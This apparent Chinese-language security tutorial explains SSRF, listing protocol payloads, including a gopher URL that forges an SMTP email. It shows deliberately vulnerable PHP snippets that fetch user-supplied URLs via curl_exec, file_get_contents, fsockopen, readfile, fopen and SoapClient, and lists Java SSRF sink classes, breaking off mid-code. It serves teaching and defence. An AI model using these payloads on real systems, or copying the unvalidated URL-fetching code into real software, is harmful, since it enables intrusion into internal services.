<h3 id="常见例子"><a href="#常见例子" class="headerlink" title="常见例子"></a>常见例子</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Dict</span>://</span><br><span class="line"><span class="attribute">dict</span>://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line"><span class="attribute">ssrf</span>.php?url=dict://attacker:<span class="number">11111</span>/</span><br><span class="line"><span class="attribute">SFTP</span>://</span><br><span class="line"><span class="attribute">ssrf</span>.php?url=sftp://example.com:<span class="number">11111</span>/</span><br><span class="line"><span class="attribute">TFTP</span>://</span><br><span class="line"><span class="attribute">ssrf</span>.php?url=tftp://example.com:<span class="number">12346</span>/TESTUDPPACKET</span><br><span class="line"><span class="attribute">LDAP</span>://</span><br><span class="line"><span class="attribute">ssrf</span>.php?url=ldap://localhost:<span class="number">11211</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br><span class="line"><span class="attribute">Gopher</span>://</span><br><span class="line"><span class="attribute">ssrf</span>.php?url=gopher://<span class="number">127.0.0.1:25</span>/xHELO%<span class="number">20</span>localhost%<span class="number">250</span>d%<span class="number">250</span>aMAIL%<span class="number">20</span>FROM%<span class="number">3</span>A%<span class="number">3</span>Chacker@site.com%<span class="number">3</span>E%<span class="number">250</span>d%<span class="number">250</span>aRCPT%<span class="number">20</span>TO%<span class="number">3</span>A%<span class="number">3</span>Cvictim@site.com%<span class="number">3</span>E%<span class="number">250</span>d%<span class="number">250</span>aDATA%<span class="number">250</span>d%<span class="number">250</span>aFrom%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">5</span>BHacker%<span class="number">5</span>D%<span class="number">20</span>%<span class="number">3</span>Chacker@site.com%<span class="number">3</span>E%<span class="number">250</span>d%<span class="number">250</span>aTo%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">3</span>Cvictime@site.com%<span class="number">3</span>E%<span class="number">250</span>d%<span class="number">250</span>aDate%<span class="number">3</span>A%<span class="number">20</span>Tue%<span class="number">2</span>C%<span class="number">2015</span>%<span class="number">20</span>Sep%<span class="number">202017</span>%<span class="number">2017</span>%<span class="number">3</span>A20%<span class="number">3</span>A26%<span class="number">20</span>-<span class="number">0400</span>%<span class="number">250</span>d%<span class="number">250</span>aSubject%<span class="number">3</span>A%<span class="number">20</span>AH%<span class="number">20</span>AH%<span class="number">20</span>AH%<span class="number">250</span>d%<span class="number">250</span>a%<span class="number">250</span>d%<span class="number">250</span>aYou%<span class="number">20</span>didn%<span class="number">27</span>t%<span class="number">20</span>say%<span class="number">20</span>the%<span class="number">20</span>magic%<span class="number">20</span>word%<span class="number">20</span>%<span class="number">21</span>%<span class="number">250</span>d%<span class="number">250</span>a%<span class="number">250</span>d%<span class="number">250</span>a%<span class="number">250</span>d%<span class="number">250</span>a.%<span class="number">250</span>d%<span class="number">250</span>aQUIT%<span class="number">250</span>d%<span class="number">250</span>a</span><br></pre></td></tr></table></figure>


<h2 id="SSRF常见的漏洞函数"><a href="#SSRF常见的漏洞函数" class="headerlink" title="SSRF常见的漏洞函数"></a>SSRF常见的漏洞函数</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>基本都是调用curl</p>
<h4 id="前置知识：php常用协议"><a href="#前置知识：php常用协议" class="headerlink" title="前置知识：php常用协议"></a>前置知识：php常用协议</h4><table>
<thead>
<tr>
<th><strong>伪协议</strong></th>
<th><strong>allow_url_fopen</strong></th>
<th><strong>allow_url_incude</strong></th>
<th><strong>其他说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;input</td>
<td>on&#x2F;off</td>
<td>on</td>
<td>在POST请求中访问POST的data部分，在enctype&#x3D;”multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>on&#x2F;off</td>
<td>on&#x2F;off</td>
<td>常用与读取源码，读取内容经过Base64编码输出</td>
</tr>
<tr>
<td>file:&#x2F;&#x2F;</td>
<td>on&#x2F;off</td>
<td>on&#x2F;off</td>
<td>读取本地文件</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>on</td>
<td>on</td>
<td>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</td>
</tr>
<tr>
<td>http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</td>
<td>on</td>
<td>on&#x2F;off</td>
<td>发起http或者https请求</td>
</tr>
<tr>
<td>gopher:&#x2F;&#x2F;</td>
<td>on&#x2F;off</td>
<td>on&#x2F;off</td>
<td>使用TCP的70端口，www之前的主流协议，支持发出GET、POST请求。使用要求为 PHP &gt; v5.3, Java JDK &lt; v1.7</td>
</tr>
<tr>
<td>dict:&#x2F;&#x2F;</td>
<td>on&#x2F;off</td>
<td>on&#x2F;off</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="php-ssrf常见函数"><a href="#php-ssrf常见函数" class="headerlink" title="php ssrf常见函数"></a>php ssrf常见函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line">SoupClient</span><br></pre></td></tr></table></figure>

<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>可以看看这篇教程所说的<br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-ref-curl.html">PHP cURL 函数 | 菜鸟教程</a><br>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。<br>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。<br>PHP中使用cURL实现Get和Post请求的方法<br>这些函数在PHP 4.0.2中被引入。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_exec函数用于执行指定的<span class="built_in">cURL</span>会话。 </span><br></pre></td></tr></table></figure>

<p>举个例子，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">//初始化curl会话</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"> <span class="comment">//关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以直接利用http协议<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696682509-dc4d40cc-975c-43e1-bbac-0102c2ec0e13.png" alt="image.png"><br>这里把简单的几种协议看看，后面就不一一看了，复杂的后面有写到利用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696779668-4c702eb6-a0af-4943-af9d-e55c5d15fa94.png" alt="image.png"><br>dict一般用法，探活<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696873694-907d140d-a7de-4b73-90db-32545808a7c9.png" alt="image.png"></p>
<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_content函数从用户指定的<span class="built_in">url</span>获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</span><br></pre></td></tr></table></figure>
<p>对于file_get_contents()函数，它是可以获取文件内容的，我们这里也简单举个栗子来介绍其利用方式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661697347466-5789072f-ba10-4704-82e6-a5e48049a710.png" alt="image.png"><br>一个绕过的tips<br>.php?jpg  .php#jpg<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7112">浅析SSRF与文件读取的一些小特性 - 先知社区</a></p>
<h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fsockopen</span> — 打开一个网络连接或者一个Unix套接字连接</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>,<span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)</span></span><br><span class="line"><span class="string">\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$out</span> =<span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .=<span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .=<span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限,传输原始数据。<br><strong>显然socket是无法读取本地文件的，而且端口限制的话，利用起来就比较麻烦了，其实就是一个socket，理解socket的实现原理差不多就懂了</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661698056849-c81b5cb5-3dd0-428c-91a8-d58bc71cbb68.png" alt="image.png"></p>
<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>() ：输出一个文件的内容。</span><br></pre></td></tr></table></figure>
<p>这个利用起来就比较局限了<br>示例代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661699079830-bd064062-e718-4717-ac5e-ce8f93468a9a.png" alt="image.png"></p>
<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>() ：打开一个文件或者URL</span><br></pre></td></tr></table></figure>
<p>示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$image</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$image</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661700571309-3c0b6b55-aae2-4b25-9248-7ba3a4f096ee.png" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661700600703-8c0883f6-908e-4677-95e2-71b5a5aae2ca.png" alt="image.png"></p>
<h4 id="SoupClient-类"><a href="#SoupClient-类" class="headerlink" title="SoupClient 类"></a>SoupClient 类</h4><p>这个就比较CTF了<br>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于XML的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是基于 SOAP 协议可专门用来访问 WEB 服务的 PHP 客户端。<br>SoapClient 是一个 php 的内置类，当其进行反序列化时，如果触发了该类中的<code>__call</code>方法，那么 <code>__call</code> 方法便可以发送 HTTP和HTTPS请求，该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [,<span class="keyword">array</span> <span class="variable">$options</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数用来指明是否时 wsdl 模式。</li>
<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选； 如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location是要将请求发送到的SOAP服务器的 URL ，而 uri 是SOAP 服务的目标命名空间。</li>
</ul>
<p>知道上述两个参数的含义之后，就很容易构造出 SSRF 的利用 payload 了。我们可以设置第一个参数为 null ，然后第二个参数为一个包含 location 和 uri 的数组，location 选项的值设置为 target_url :<br>首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">not_exists_function</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661702103679-a065ab17-84bb-40ea-8a50-09f200ad3e9e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661702103739-dbe29b0b-791c-4815-b4cf-46325e0ed72e.png" alt="image.png"><br>如上图所示，ssrf触发成功，就不复现了，基本上看了下面的文章差不多就懂了<br>由于它<strong>仅限于http&#x2F;https协议</strong>，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202025">Session反序列化利用和SoapClient+crlf组合拳进行SSRF - 安全客，安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/80918004">SoapClient反序列化SSRF</a></p>
<h4 id="php关于ssrf的一些局限"><a href="#php关于ssrf的一些局限" class="headerlink" title="php关于ssrf的一些局限"></a>php关于ssrf的一些局限</h4><ul>
<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
<li>file_get_contents 的 gopher 协议不能 URLencode</li>
<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
<li>PHP 的 curl 默认不 follow 302 跳转</li>
<li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
</ul>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><h4 id="java网络请求支持的协议"><a href="#java网络请求支持的协议" class="headerlink" title="java网络请求支持的协议"></a>java网络请求支持的协议</h4><p>由于Java没有php的cURL，所以Java SSRF支持的协议，不能像php使用curl -V查看。<br>Java网络请求支持的协议可通过下面几种方法检测：</p>
<ul>
<li>代码中遍历协议</li>
<li>官方文档中查看</li>
<li>import sun.net.<a target="_blank" rel="noopener" href="http://www.protocol查看/">www.protocol查看</a></li>
</ul>
<p>从import sun.net.<a target="_blank" rel="noopener" href="http://www.protocol可以看到,支持以下协议,jar协议比较有意思,不过利用起来感觉比较窄/">www.protocol可以看到，支持以下协议，jar协议比较有意思，不过利用起来感觉比较窄</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc gopher</span><br></pre></td></tr></table></figure>
<p>虽然看到有gopher，但是gopher实际在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置，<br>具体可以看 <a target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=865541">https://bugzilla.redhat.com/show_bug.cgi?id=865541</a><br>以及<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/8067bdeb4e31">http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/8067bdeb4e31</a><br>其中每个协议都有一个Handle,Handle定义了这个协议如何去打开一个连接。</p>
<h4 id="java-ssrf常见的函数"><a href="#java-ssrf常见的函数" class="headerlink" title="java ssrf常见的函数"></a>java ssrf常见的函数</h4><p>基本上如果是URLConnection|URL发起的请求，那么对于上文中所提到的所有protocol都支持，但是如果经过二次包装或者其他的一些类发出的请求，一些带http名字的或者Request这种，一般只支持http&#x2F;https协议，所以java的利用面一般还是比较狭隘的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URLConnection.getInputStream</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">HttpClients.execute</span><br><span class="line">HttpClient.execute</span><br><span class="line">om.alibaba.druid.util.HttpClientUtils</span><br><span class="line">sun.net.www.http.HttpClient</span><br><span class="line">javax.net.ssl.HttpsURLConnection</span><br><span class="line">sun.net.www.protocol.http.HttpURLConnection</span><br><span class="line">java.net.HttpURLConnection</span><br><span class="line">javax.servlet.http.HttpServletRequest</span><br><span class="line">java.net.URI</span><br><span class="line">java.net.URLConnection</span><br><span class="line">com.bea.uddiexplorer.Search</span><br><span class="line">com.squareup.okhttp.Request</span><br><span class="line">com.squareup.okhttp3.Request</span><br><span class="line">org.apache.commons.httpclient.HttpMethodBase</span><br><span class="line">org.apache.http.client.methods.HttpRequestBase</span><br></pre></td></tr></table></figure>
<p>除了建立HTTP协议连接，还可能直接通过 Socket建立连接，因此应该同样关注Socket相关类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AsynchronousServerSocketChannel.accept/bind</span><br><span class="line">AsynchronousSocketChannel.write/read/bind/connect</span><br><span class="line">ServerSocketChannel.bind</span><br><span class="line">ServerSocket.accept/bind</span><br><span class="line">Socket.bind/connect</span><br><span class="line">Socket.<span class="title function_ invoke__">getInputStream</span>().read</span><br><span class="line">Socket.<span class="title function_ invoke__">getOutputStream</span>().write</span><br><span class="line">SocketChannel.bind/read/write/connect</span><br></pre></td></tr></table></figure>
<p><strong>总之</strong><br>如果用以下类的方法发起请求，则支持sun.net.<a target="_blank" rel="noopener" href="http://www.protocol所有协议/">www.protocol所有协议</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLConnection</span><br><span class="line">URL</span><br></pre></td></tr></table></figure>
<p>其它的带http的只支持http&#x2F;http协议<br>这里举几个例子<br><a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a><br>可以看看里面的分析<br><a target="_blank" rel="noopener" href="https://joychou.org/java/javassrf.html#directory0075141260163416932">SSRF in JAVA - 贫民窟的艺术家</a><br>直接用这个大哥代码来举例了，直接配置就好了，配置看后面吧，这里可以直接看引用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.okhttp.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.httpclient.HttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.httpclient.methods.GetMethod;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.fluent.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.nio.client.CloseableHttpAsyncClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.nio.client.HttpAsyncClients;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.util.EntityUtils;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.Jsoup;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.nodes.Document;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br></pre></td></tr></table></figure>
<h4 id="URLConnection-URL"><a href="#URLConnection-URL" class="headerlink" title="URLConnection|URL"></a>URLConnection|URL</h4><p>我们看看代码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789085951-54500db3-8220-4994-9b60-814b5edd7921.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">URLConnection</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        URLConnection urlConnection = u.<span class="title function_ invoke__">openConnection</span>();</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.<span class="title function_ invoke__">getInputStream</span>())); <span class="comment">//send request</span></span><br><span class="line">        <span class="comment">// BufferedReader in = new 